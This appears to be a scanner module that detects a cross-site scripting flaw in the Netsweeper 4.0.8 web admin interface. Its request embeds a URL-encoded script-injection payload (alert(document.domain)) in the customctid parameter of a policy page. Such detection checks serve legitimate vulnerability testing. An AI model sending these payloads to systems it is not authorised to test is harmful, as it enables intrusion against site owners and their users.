#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Multiple cross-site scripting vulnerabilities in Netsweeper before 3."""
...
class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Netsweeper 4.0.8 - Cross-Site Scripting Detection',
    ...
    def run(self):
        r = self.http_request(method="GET", path='/webadmin/policy/category_table_ajax.php?customctid=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E', allow_redirects=False)
        ...
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="Netsweeper 4.0.8 - Cross-Site Scripting detected",
